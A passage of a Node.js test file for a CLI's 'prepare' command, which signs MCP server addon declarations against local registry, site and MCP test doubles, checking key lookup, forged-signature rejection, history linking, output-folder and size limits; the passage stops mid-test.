// prepare against local test doubles: a registry on 127.0.0.1 (read through
// the real hardened fetch, which accepts a loopback http registry base), and a
// publisher site and MCP server reached through the same hardened fetch, with
// the made up host names pinned to 127.0.0.1. Key lookups are fakes. Keys are
// throwaway keys made for this run; output folders live under the OS temp
// folder and are removed afterwards. Nothing leaves the machine.

import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { main, HELP, HELP_PREPARE, PREPARE_STATES } from '../lib/cli.js';
import { urlHoldsKey, nameHoldsKey } from '../lib/keylike.js';
import { httpsRequest, isPublicAddress, keysFromDns, hostWithoutAddress } from '../lib/resolve.js';
import { signDeclaration, declarationHash, SPEC_ID_01, SPEC_ID_02, STATES } from '../lib/declaration.js';
import { parseProofRecords } from '../lib/keys.js';
import { toolsHash } from '../lib/tools.js';
import { toolSetDigestsFromPages } from '../lib/tool-set-digest.js';
import { LISTING_STATES, registryBase, DEFAULT_REGISTRY } from '../lib/listing.js';
import { MODERN_PROTOCOL_VERSION, fetchToolsList } from '../lib/mcp-client.js';
import { makeKey, TOOLS } from '../testlib/helpers.js';

const NAME = 'com.example/weather';
const HOST = 'example.com';
const REMOTE = 'https://example.com/mcp';
const NOW = '2026-11-19T12:00:00Z';
const PP = 'io.modelcontextprotocol.registry/publisher-provided';
const ESC = String.fromCharCode(27);
const RLO = String.fromCharCode(0x202e);
const k = makeKey('ed25519');
const k2 = makeKey('ed25519');
const kp = makeKey('ecdsap384');
const published = parseProofRecords(k.record).keys;
const TOOLS_TEXT = JSON.stringify(TOOLS);
const tsd = toolSetDigestsFromPages([TOOLS_TEXT]);
const folder = `/.well-known/addon-declaration/${NAME}/`;
const hex = (d) => declarationHash(d).slice('sha256:'.length);
const text = (d) => JSON.stringify(d, null, 2) + '\n';

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'addon-declare-prepare-'));
test.after(() => fs.rmSync(tmp, { recursive: true, force: true }));
let outCount = 0;
const freshOut = () => path.join(tmp, `out-${++outCount}`);

// The declaration the site serves today for 1.0.0 (format 0.1, then 0.2).
const d1 = signDeclaration({ spec: SPEC_ID_01, name: NAME, version: '1.0.0', toolsHash: toolsHash(TOOLS), remotes: [{ type: 'streamable-http', url: REMOTE }], contact: 'mailto:security@example.com', issuedAt: '2026-11-18T10:00:00Z', expiresAt: '2027-05-18T10:00:00Z', key: { method: 'http', domain: HOST } }, k.loaded);
const d2 = signDeclaration({ spec: SPEC_ID_02, name: NAME, version: '1.0.0', toolSetDigest: { spec: 'mcp-tool-set-digest/1', contract: tsd.contract.digest, extras: tsd.extras.digest }, remotes: [{ type: 'streamable-http', url: REMOTE }], issuedAt: '2026-11-18T11:00:00Z', expiresAt: '2027-05-18T10:00:00Z', previous: declarationHash(d1), key: { method: 'http', domain: HOST } }, k.loaded);

function listingFor({ name = NAME, version = '1.0.0', remotes = [{ type: 'streamable-http', url: REMOTE }], pointerTo, meta, isLatest = true } = {}) {
  const server = { name, version, description: 'Weather tools', remotes };
  if (meta !== undefined) server._meta = meta;
  if (pointerTo) server._meta = { [PP]: { addonDeclaration: { url: `https://${HOST}${folder}by-hash/${hex(pointerTo)}.json`, hash: declarationHash(pointerTo) } } };
  return { server, _meta: { 'io.modelcontextprotocol.registry/official': { status: 'active', publishedAt: '2026-11-19T01:16:58.545256Z', updatedAt: '2026-11-19T01:16:58.545256Z', isLatest } } };
}

const regPath = (version = 'latest', name = NAME) => `/v0.1/servers/${name.replace('/', '%2F')}/versions/${encodeURIComponent(version)}`;

async function serve(routes, seen) {
  const server = http.createServer((req, res) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => {
      const body = Buffer.concat(chunks).toString('utf8');
      const host = String(req.headers.host).replace(/:\d+$/, '');
      seen.push({ method: req.method, host, path: req.url, headers: req.headers, body });
      const r = routes[`${req.method} ${host}${req.url}`] ?? routes[`${host}${req.url}`] ?? routes[req.url];
      if (typeof r === 'function') return r(req, res, body);
      if (!r) {
        res.writeHead(404);
        return res.end('not found');
      }
      res.writeHead(r.status ?? 200, r.headers ?? { 'Content-Type': 'application/json' });
      res.end(typeof r.body === 'string' || Buffer.isBuffer(r.body) ? r.body : JSON.stringify(r.body));
    });
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  return { port: server.address().port, close: () => (server.closeAllConnections(), new Promise((r) => server.close(r))) };
}

// An MCP server double that speaks revision 2026-07-28. mode: 'modern', 'paged', 'auth'.
function mcpServer(mode = 'modern', { tools = TOOLS.tools, log = [] } = {}) {
  return (req, res, body) => {
    const m = JSON.parse(body);
    log.push(m);
    if (mode === 'auth') {
      res.writeHead(401, { 'WWW-Authenticate': 'Bearer resource_metadata="https://example.com/.well-known/oauth-protected-resource"' });
      return res.end();
    }
    const cursor = m.params && m.params.cursor;
    let result;
    if (mode === 'paged') {
      const i = cursor === undefined ? 0 : Number(cursor);
      result = i + 1 < tools.length ? { tools: [tools[i]], nextCursor: String(i + 1) } : { tools: [tools[i]] };
    } else result = { tools };
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ jsonrpc: '2.0', id: m.id, result: { ...result, resultType: 'complete' } }));
  };
}

// lookupFor: (url) => a lookupAll for the hardened fetch, or undefined for 127.0.0.1.
async function world({ registry = {}, site = {}, httpKeys = { keys: published, notes: [] }, dnsKeys = { keys: [], notes: ['no TXT records at example.com'] }, extraDeps = {}, lookupFor } = {}) {
  const seen = [];
  const reg = await serve(registry, seen);
  const st = await serve(site, seen);
  const request = (url, opts) => {
    const u = new URL(url);
    if (u.protocol === 'http:') return httpsRequest(url, opts);
    const local = `http://${u.hostname}:${st.port}${u.pathname}${u.search}`;
    return httpsRequest(local, { ...opts, transport: http, lookupAll: (lookupFor && lookupFor(u)) || (async () => [{ address: '127.0.0.1', family: 4 }]), allowAddress: (a) => a === '127.0.0.1' || isPublicAddress(a) });
  };
  const lookups = [];
  const deps = {
    httpsRequest: request,
    keysFromHttp: async (domain) => (lookups.push(['http', domain]), typeof httpKeys === 'function' ? httpKeys(domain) : httpKeys),
    keysFromDns: async (domain) => (lookups.push(['dns', domain]), typeof dnsKeys === 'function' ? dnsKeys(domain) : dnsKeys),
    dnsResolverFor: () => ({}),
    ...extraDeps,
  };
  const registryUrl = `http://127.0.0.1:${reg.port}`;
  return {
    seen,
    lookups,
    registryUrl,
    async run(args, { env = {}, command = 'prepare', registryArg = true } = {}) {
      let stdout = '';
      let stderr = '';
      const full = command === 'prepare' ? [command, ...args, ...(registryArg ? ['--registry', registryUrl] : []), ...(args.includes('--now') ? [] : ['--now', NOW])] : [command, ...args];
      const code = await main(full, { stdout: { write: (s) => (stdout += s) }, stderr: { write: (s) => (stderr += s) }, env, deps });
      return { code, stdout, stderr, json: args.includes('--json') && stdout ? JSON.parse(stdout) : null };
    },
    async close() {
      await reg.close();
      await st.close();
    },
  };
}

// The CLI with no network (offline commands).
async function cli(argv, env = {}) {
  let stdout = '';
  let stderr = '';
  const code = await main(argv, { stdout: { write: (s) => (stdout += s) }, stderr: { write: (s) => (stderr += s) }, env });
  return { code, stdout, stderr };
}

async function scenario(opts, args, fn, runOpts) {
  const w = await world(opts);
  try {
    const r = await w.run(args, runOpts);
    await fn(r, w);
  } finally {
    await w.close();
  }
}

// The registry's list of versions of a name (GET /v0.1/servers/<name>/versions).
const versionsPath = (name = NAME) => `/v0.1/servers/${name.replace('/', '%2F')}/versions`;
const versionsList = (...listings) => ({ body: { servers: listings, metadata: { count: listings.length } } });
const baseRegistry = (extra = {}) => ({ [regPath()]: { body: listingFor() }, [versionsPath()]: versionsList(listingFor()), ...extra });
const baseSite = (extra = {}) => ({ [`POST ${HOST}/mcp`]: mcpServer(), ...extra });
const ENV = { MCP_PRIVATE_KEY: k.hex };

function filesUnder(dir) {
  const out = [];
  const walk = (rel) => {
    for (const e of fs.readdirSync(path.join(dir, rel), { withFileTypes: true })) {
      const r = rel ? `${rel}/${e.name}` : e.name;
      if (e.isDirectory()) walk(r);
      else out.push(r);
    }
  };
  if (fs.existsSync(dir)) walk('');
  return out.sort();
}

function assertNoSecrets(...outputs) {
  for (const o of outputs) for (const s of [...k.secretStrings, ...k2.secretStrings, ...kp.secretStrings]) assert.ok(!o.includes(s), 'key material in the output');
}

// The site as it is after the upload: the files of the output folder at their URLs.
function uploadedSite(out, extra = {}) {
  const site = { ...extra };
  const siteDir = path.join(out, 'site');
  for (const rel of filesUnder(siteDir)) site[`${HOST}/${rel}`] = { body: fs.readFileSync(path.join(siteDir, rel)) };
  return site;
}

test('prepared: one run reads, links nothing (no latest.json), signs, checks and writes the files to upload', async () => {
  const out = freshOut();
  const log = [];
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: mcpServer('modern', { log }) }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--contact', 'mailto:security@example.com'], (r, w) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /^prepared: com\.example\/weather for version 1\.0\.1\n/);
    for (let n = 1; n <= 9; n++) assert.match(r.stdout, new RegExp(`\\n  step ${n}, `), `step ${n} line`);
    assert.match(r.stdout, /step 2, key record: found by the http method at https:\/\/example\.com\/\.well-known\/mcp-registry-auth/);
    assert.match(r.stdout, /step 5, previous declaration: latest\.json is absent \(HTTP 404\)/);
    assert.match(r.stdout, /step 9, check: .*gives verified \(exit code 0\)/);
    assert.match(r.stdout, /run: node bin\/addon-declare\.js check-listing com\.example\/weather --version 1\.0\.1 --fetch-tools/);
    assert.deepEqual(w.lookups, [['http', HOST]], 'http found the record, so dns was not asked');
    // The registry was asked for the latest listing and whether 1.0.1 exists.
    assert.ok(w.seen.some((s) => s.path === regPath()));
    assert.ok(w.seen.some((s) => s.path === regPath('1.0.1')));
    assert.ok(!w.seen.some((s) => s.method !== 'GET' && s.method !== 'POST'), 'only reads and the tools/list POST');
    assertNoSecrets(r.stdout, r.stderr);
  }, { env: ENV });
  assert.equal(log.length, 1);
  assert.equal(log[0].method, 'tools/list');
  const files = filesUnder(out);
  const decl = JSON.parse(fs.readFileSync(path.join(out, 'declaration.unsigned.json'), 'utf8'));
  assert.equal(decl.spec, SPEC_ID_02);
  assert.equal(decl.version, '1.0.1');
  assert.equal(decl.expiresAt, '2027-05-18T12:00:00Z', '180 days by default');
  const site = `site/.well-known/addon-declaration/${NAME}/`;
  const byHash = files.find((f) => f.startsWith(`${site}by-hash/`));
  assert.ok(byHash, files.join(', '));
  assert.deepEqual(files, ['NEXT_STEPS.txt', 'declaration.unsigned.json', 'pointer.json', byHash, `${site}latest.json`, `${site}versions/1.0.1.json`].sort());
  const signedBytes = fs.readFileSync(path.join(out, byHash));
  assert.deepEqual(fs.readFileSync(path.join(out, `${site}latest.json`)), signedBytes);
  assert.deepEqual(fs.readFileSync(path.join(out, `${site}versions/1.0.1.json`)), signedBytes);
  const signed = JSON.parse(signedBytes.toString('utf8'));
  assert.equal(byHash, `${site}by-hash/${hex(signed)}.json`);
  assert.equal(signed.key.id, k.loaded.public.id);
  assert.equal(signed.previous, undefined);
  assert.deepEqual(signed.toolSetDigest, { spec: 'mcp-tool-set-digest/1', contract: tsd.contract.digest, extras: tsd.extras.digest });
  const pointer = JSON.parse(fs.readFileSync(path.join(out, 'pointer.json'), 'utf8'));
  assert.deepEqual(pointer, { _meta: { [PP]: { addonDeclaration: { url: `https://${HOST}${folder}by-hash/${hex(signed)}.json`, hash: declarationHash(signed) } } } });
  const next = fs.readFileSync(path.join(out, 'NEXT_STEPS.txt'), 'utf8');
  assert.match(next, /^1\. Upload these files to example\.com/m);
  assert.match(next, /Content-Type: application\/json/);
  assert.ok(next.includes(`https://${HOST}${folder}by-hash/${hex(signed)}.json`));
  assert.match(next, /^2\. .*mcp-publisher publish/ms);
  assert.match(next, /^3\. .*check-listing com\.example\/weather --version 1\.0\.1 --fetch-tools/ms);
  assert.ok(!/\s-\s|\s--\s|[\u2012-\u2015\u2212]/.test(next.replace(/--[a-z]/g, '')), 'no dash punctuation');
  assertNoSecrets(...files.map((f) => fs.readFileSync(path.join(out, f), 'utf8')));

  // verify, offline, as a user would.
  const toolsFile = path.join(tmp, 'tools-ok.json');
  fs.writeFileSync(toolsFile, TOOLS_TEXT);
  const v = await cli(['verify', path.join(out, byHash), '--pubkey', k.record, '--tools', toolsFile, '--format', '0.2', '--now', NOW]);
  assert.equal(v.code, 0, v.stdout + v.stderr);

  // After the upload and the publication: check-listing on the new listing.
  const newListing = listingFor({ version: '1.0.1' });
  newListing.server._meta = pointer._meta;
  const w2 = await world({ registry: { [regPath('1.0.1')]: { body: newListing } }, site: uploadedSite(out, { [`POST ${HOST}/mcp`]: mcpServer() }) });
  try {
    const c = await w2.run([NAME, '--version', '1.0.1', '--registry', w2.registryUrl, '--fetch-tools', '--now', NOW], { command: 'check-listing' });
    assert.equal(c.code, 0, c.stdout + c.stderr);
    assert.match(c.stdout, /^verified: com\.example\/weather 1\.0\.1/);
    assert.match(c.stdout, /tool set digest: contract match, extras match/);
  } finally {
    await w2.close();
  }
});

test('dry run: only the unsigned declaration is written; signing it with sign gives the predicted hash', async () => {
  const out = freshOut();
  let predicted;
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', out, '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.state, 'prepared_unsigned');
    assert.equal(r.json.signed, false);
    assert.equal(r.json.steps.find((s) => s.step === 7).result, 'skipped');
    assert.match(r.json.steps.find((s) => s.step === 7).line, /not signed \(no --key-file or --key-env\)/);
    assert.equal(r.json.steps.find((s) => s.step === 9).result, 'skipped');
    predicted = r.json.declaration.predictedHash;
    assert.match(predicted, /^sha256:[0-9a-f]{64}$/);
    assert.equal(r.json.pointer.bytes < 4096, true);
  });
  assert.deepEqual(filesUnder(out), ['declaration.unsigned.json']);
  // --dry-run with a key option does not read the key at all (an unset variable is not an error).
  const out2 = freshOut();
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', out2, '--dry-run', '--key-env', 'NOT_SET_ANYWHERE'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /^prepared_unsigned: com\.example\/weather for version 1\.0\.1 \(dry run\)/);
    assert.match(r.stdout, /not signed \(dry run\)/);
    assert.match(r.stdout, /note: the private key was not read \(dry run\)/);
  });
  // Signing the unsigned file by hand gives the hash the dry run predicted.
  const signedFile = path.join(tmp, 'dry-signed.json');
  const s = await cli(['sign', path.join(out, 'declaration.unsigned.json'), '--key-env', 'MCP_PRIVATE_KEY', '--out', signedFile], ENV);
  assert.equal(s.code, 0, s.stderr);
  assert.equal(declarationHash(JSON.parse(fs.readFileSync(signedFile, 'utf8'))), predicted);
});

test('namespace_not_domain: GitHub and single label namespaces are refused before any request', async () => {
  for (const name of ['io.github.someone/tool', 'io.github/tool', 'localhost/tool']) {
    const out = freshOut();
    await scenario({ registry: baseRegistry(), site: baseSite() }, [name, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out], (r, w) => {
      assert.equal(r.code, PREPARE_STATES.namespace_not_domain, r.stdout + r.stderr);
      assert.equal(r.code, 24);
      assert.match(r.stdout, /^namespace_not_domain: /);
      assert.match(r.stdout, /no declaration can be made for this name; nothing was read/);
      assert.equal(w.seen.length, 0);
      assert.deepEqual(w.lookups, []);
    }, { env: ENV });
    assert.deepEqual(filesUnder(out), []);
  }
});

test('key_record_not_found and key_record_lookup_failed: what the publisher must have, and nothing signed', async () => {
  const out = freshOut();
  await scenario({ registry: baseRegistry(), site: baseSite(), httpKeys: { keys: [], notes: ['https://example.com/.well-known/mcp-registry-auth answered HTTP 404; only 200 is read and redirects are not followed'], status: 404 } }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out], (r, w) => {
    assert.equal(r.code, 26, r.stdout + r.stderr);
    assert.match(r.stdout, /^key_record_not_found: /);
    assert.deepEqual(w.lookups, [['http', HOST], ['dns', HOST]], 'http, then dns');
    assert.match(r.stdout, /v=MCPv1; k=<alg>; p=<public key>/);
    assert.match(r.stdout, /mcp-publisher login http/);
    assert.match(r.stdout, /mcp-publisher login dns/);
    assert.ok(!w.seen.some((s) => s.method === 'POST'), 'no tools/list was sent');
  }, { env: ENV });
  assert.deepEqual(filesUnder(out), []);
  await scenario({ registry: baseRegistry(), site: baseSite(), httpKeys: { keys: [], notes: [], error: 'timed out' } }, [NAME, '--for-version', '1.0.1', '--method', 'http', '--out', freshOut()], (r, w) => {
    assert.equal(r.code, 27, r.stdout + r.stderr);
    assert.match(r.stdout, /^key_record_lookup_failed: /);
    assert.deepEqual(w.lookups, [['http', HOST]], '--method http asks only http');
  });
  // --method dns reads TXT records, ADKv1 included.
  const adk = parseProofRecords(k.record.replace('v=MCPv1', 'v=ADKv1')).keys;
  await scenario({ registry: baseRegistry(), site: baseSite(), dnsKeys: { keys: adk, notes: [] } }, [NAME, '--for-version', '1.0.1', '--method', 'dns', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.keyRecord.method, 'dns');
    assert.equal(r.json.keyRecord.keys[0].kind, 'ADKv1');
  }, { env: ENV });
});

test('key_mismatch: a key that is not the published record is refused before signing, and no key material is shown', async () => {
  for (const [label, key, extra] of [['ed25519 by env', k2, {}], ['P-384 by file', kp, { file: true }]]) {
    const out = freshOut();
    const args = [NAME, '--for-version', '1.0.1', '--out', out];
    let env = {};
    if (extra.file) {
      const keyDir = fs.mkdtempSync(path.join(tmp, 'key-'));
      const kf = path.join(keyDir, 'key.pem');
      fs.writeFileSync(kf, key.pem);
      args.push('--key-file', kf);
    } else {
      env = { MCP_PRIVATE_KEY: key.hex };
      args.push('--key-env', 'MCP_PRIVATE_KEY');
    }
    await scenario({ registry: baseRegistry(), site: baseSite() }, args, (r, w) => {
      assert.equal(r.code, 31, `${label}: ${r.stdout}${r.stderr}`);
      assert.match(r.stdout, /^key_mismatch: /);
      assert.ok(r.stdout.includes(key.loaded.public.id), 'the public key id of the key given is named');
      assert.ok(r.stdout.includes(k.loaded.public.id), 'the published record is named');
      assert.match(r.stdout, /would not verify \(key_not_found\)/);
      // The records, as a publisher knows them, for comparison (public keys only).
      assert.ok(r.stdout.includes(`whose record is "${key.record}"`), 'the record of the key given is shown');
      assert.ok(r.stdout.includes(`("${k.record}")`), 'the published record is shown');
      assert.match(r.stdout, /step 7, signing: the private key given belongs to/);
      // Nothing after the key record was read: no tools/list, no latest.json.
      assert.ok(!w.seen.some((s) => s.method === 'POST' || s.path.endsWith('latest.json')));
      assertNoSecrets(r.stdout, r.stderr);
    }, { env });
    assert.deepEqual(filesUnder(out), []);
  }
});

test('a paged tool list is read to the end and signed as one list', async () => {
  const out = freshOut();
  const log = [];
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: mcpServer('paged', { log }) }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.tools.source, 'remote');
    assert.equal(r.json.tools.pages, 2);
    assert.equal(r.json.tools.protocolVersion, MODERN_PROTOCOL_VERSION);
    assert.equal(r.json.tools.contract, tsd.contract.digest);
    assert.equal(r.json.tools.extras, tsd.extras.digest);
    assert.equal(r.json.preview.state, 'verified');
    assert.equal(r.json.fetched.filter((f) => f.rpc === 'tools/list').length, 2);
  }, { env: ENV });
  assert.equal(log.length, 2);
  assert.equal(log[1].params.cursor, '1');
});

test('an existing declaration at latest.json is verified and linked as previous; one the site does not serve by hash is added to the upload', async () => {
  // latest.json serves the 0.2 declaration, and its by-hash file is served too.
  const out = freshOut();
  const site = baseSite({ [`${HOST}${folder}latest.json`]: { body: text(d2) }, [`${HOST}${folder}by-hash/${hex(d2)}.json`]: { body: text(d2) } });
  await scenario({ registry: baseRegistry(), site }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.hash, declarationHash(d2));
    assert.equal(r.json.previous.linked, true);
    assert.equal(r.json.verify.state, 'valid');
    assert.ok(r.json.verify.checked.includes('chain link to previous declaration'));
    assert.equal(r.json.files.filter((f) => f.upload).length, 3);
  }, { env: ENV });
  const unsigned = JSON.parse(fs.readFileSync(path.join(out, 'declaration.unsigned.json'), 'utf8'));
  assert.equal(unsigned.previous, declarationHash(d2));
  // A 0.1 declaration at latest.json whose by-hash file is missing: linked, and a copy is written to upload.
  const out2 = freshOut();
  await scenario({ registry: baseRegistry(), site: baseSite({ [`${HOST}${folder}latest.json`]: { body: text(d1) } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out2], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.match(r.stdout, new RegExp(`latest\\.json holds ${declarationHash(d1)} \\(addon-declaration/0\\.1, version 1\\.0\\.0\\)`));
    assert.match(r.stdout, /a copy of it is written with the files to upload/);
    assert.match(r.stdout, /note: the previous declaration names a contact and this one does not/);
  }, { env: ENV });
  assert.equal(fs.readFileSync(path.join(out2, `site/.well-known/addon-declaration/${NAME}/by-hash/${hex(d1)}.json`), 'utf8'), text(d1));
  assert.match(fs.readFileSync(path.join(out2, 'NEXT_STEPS.txt'), 'utf8'), new RegExp(`by-hash/${hex(d1)}\\.json`));
  // A declaration at latest.json under a key the domain no longer publishes (a
  // rotation) is linked without a signature check, with a note (SPEC.md section 7).
  const foreign = signDeclaration({ ...JSON.parse(text(d2)), signature: undefined, key: { method: 'http', domain: HOST } }, k2.loaded);
  await scenario({ registry: baseRegistry(), site: baseSite({ [`${HOST}${folder}latest.json`]: { body: text(foreign) } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.linked, true);
    assert.equal(r.json.previous.state, 'key_not_found');
    assert.equal(r.json.previous.signatureChecked, false);
    assert.equal(r.json.declaration.previous, declarationHash(foreign));
    assert.ok(r.json.notes.some((n) => /is not published now, as after a rotation/.test(n)));
    assert.ok(r.json.notes.some((n) => /crosses a change of key/.test(n)));
    assert.ok(r.json.verify.checked.some((c) => /the key changed/.test(c)), r.json.verify.checked.join('; '));
  }, { env: ENV });
  // A declaration for this server whose signature does not verify under a
  // published key is not linked; since a declaration for this server is there,
  // the run stops (previous_not_linkable) instead of starting a new history.
  const forged = { ...JSON.parse(text(d2)), signature: JSON.parse(text(d1)).signature };
  await scenario({ registry: baseRegistry(), site: baseSite({ [`${HOST}${folder}latest.json`]: { body: text(forged) } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 36, r.stdout + r.stderr);
    assert.equal(r.json.previous.linked, false);
    assert.equal(r.json.previous.result, 'invalid_signature');
    assert.ok(r.json.notes.some((n) => /latest\.json is not linked as previous: it gives invalid_signature/.test(n)));
    assert.ok(r.json.reasons.some((x) => /give --no-previous to start a new history on purpose/.test(x)));
  }, { env: ENV });
});

test('previous_unreadable and key_record_lookup_failed: the history link is not dropped on a transient error', async () => {
  // latest.json answers 503: stop, nothing written.
  const out = freshOut();
  await scenario({ registry: baseRegistry(), site: baseSite({ [`${HOST}${folder}latest.json`]: { status: 503, body: 'busy' } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out], (r) => {
    assert.equal(r.code, PREPARE_STATES.previous_unreadable, r.stdout + r.stderr);
    assert.equal(r.code, 35);
    assert.match(r.stdout, /^previous_unreadable: /);
    assert.match(r.stdout, /answered HTTP 503/);
    assert.match(r.stdout, /gap in the history/);
  }, { env: ENV });
  assert.deepEqual(filesUnder(out), []);
  // latest.json holds a dns method declaration and the dns lookup fails.
  const dnsDecl = signDeclaration({ ...JSON.parse(text(d2)), signature: undefined, key: { method: 'dns', domain: HOST } }, k.loaded);
  await scenario({ registry: baseRegistry(), site: baseSite({ [`${HOST}${folder}latest.json`]: { body: text(dnsDecl) } }), dnsKeys: { keys: [], notes: [], error: 'SERVFAIL' } }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut()], (r) => {
    assert.equal(r.code, 27, r.stdout + r.stderr);
    assert.match(r.stdout, /^key_record_lookup_failed: /);
    assert.match(r.stdout, /the key lookup for latest\.json \(the dns method at example\.com\) could not be completed/);
  }, { env: ENV });
  // latest.json is absent: the declaration the listing names is followed (its hash checked).
  const registry = baseRegistry({ [regPath()]: { body: listingFor({ pointerTo: d2 }) } });
  await scenario({ registry, site: baseSite({ [`${HOST}${folder}by-hash/${hex(d2)}.json`]: { body: text(d2) } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.linked, true);
    assert.equal(r.json.previous.hash, declarationHash(d2));
    assert.match(r.json.previous.source, /by-hash/);
    assert.match(r.json.steps.find((s) => s.step === 5).line, /the declaration the listing of 1\.0\.0 names holds/);
  }, { env: ENV });
  // The listing names d2, but its by-hash URL serves another declaration: not
  // linked, and since the listing names a declaration, the run stops
  // (previous_not_linkable) unless --no-previous accepts a new history.
  await scenario({ registry, site: baseSite({ [`${HOST}${folder}by-hash/${hex(d2)}.json`]: { body: text(d1) } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, PREPARE_STATES.previous_not_linkable, r.stdout + r.stderr);
    assert.equal(r.json.previous.linked, false);
    assert.equal(r.json.previous.tried[0].result, 'not_the_named_one');
  }, { env: ENV });
  // The listing names d2, and its by-hash URL answers 502: stop.
  await scenario({ registry, site: baseSite({ [`${HOST}${folder}by-hash/${hex(d2)}.json`]: { status: 502, body: 'bad gateway' } }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 35, r.stdout + r.stderr);
  });
});

test('output_folder_not_empty: refused before any request; --force replaces only what this run writes', async () => {
  const out = freshOut();
  fs.mkdirSync(out, { recursive: true });
  fs.writeFileSync(path.join(out, 'mine.txt'), 'keep me');
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out], (r, w) => {
    assert.equal(r.code, 32, r.stdout + r.stderr);
    assert.match(r.stdout, /^output_folder_not_empty: /);
    assert.match(r.stdout, /--force/);
    assert.equal(w.seen.length, 0, 'no request was made');
    assert.deepEqual(w.lookups, []);
  }, { env: ENV });
  assert.deepEqual(filesUnder(out), ['mine.txt']);
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--force'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /note: the output folder also holds 1 file this run did not write \(such as mine\.txt\)/);
  }, { env: ENV });
  assert.equal(fs.readFileSync(path.join(out, 'mine.txt'), 'utf8'), 'keep me');
  // --out naming a file is a usage error.
  const asFile = path.join(tmp, 'a-file.txt');
  fs.writeFileSync(asFile, 'x');
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', asFile], (r) => {
    assert.equal(r.code, 1);
    assert.match(r.stderr, /--out names a file, not a folder/);
  });
});

test('pointer_too_large: publisher metadata over 4096 bytes is refused, signed or not, and nothing is written', async () => {
  const sj = path.join(tmp, 'server-big.json');
  fs.writeFileSync(sj, JSON.stringify({ name: NAME, version: '1.0.1', remotes: [{ type: 'streamable-http', url: REMOTE }], _meta: { [PP]: { notes: 'x'.repeat(3900) } } }));
  for (const keyArgs of [['--key-env', 'MCP_PRIVATE_KEY'], []]) {
    const out = freshOut();
    await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--server-json', sj, '--out', out, ...keyArgs], (r) => {
      assert.equal(r.code, 33, r.stdout + r.stderr);
      assert.match(r.stdout, /^pointer_too_large: /);
      assert.match(r.stdout, /at most 4096 bytes/);
      assert.match(r.stdout, /carries 1 other member of the server\.json given/);
    }, { env: ENV });
    assert.deepEqual(filesUnder(out), []);
  }
  // A small extra member is kept in pointer.json, and the size is reported.
  const sj2 = path.join(tmp, 'server-small.json');
  fs.writeFileSync(sj2, JSON.stringify({ name: NAME, version: '1.0.1', remotes: [{ type: 'streamable-http', url: 'https://EXAMPLE.com:443' }], _meta: { [PP]: { tier: 'free' } } }));
  const out = freshOut();
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listingFor({ remotes: [{ type: 'streamable-http', url: 'https://example.com/' }] }) } }), site: baseSite({ [`POST ${HOST}/`]: mcpServer() }) }, [NAME, '--for-version', '1.0.1', '--server-json', sj2, '--out', out, '--key-env', 'MCP_PRIVATE_KEY', '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.deepEqual(Object.keys(r.json.pointer.meta[PP]), ['tier', 'addonDeclaration']);
    assert.equal(r.json.pointer.bytes, Buffer.byteLength(JSON.stringify(r.json.pointer.meta[PP])));
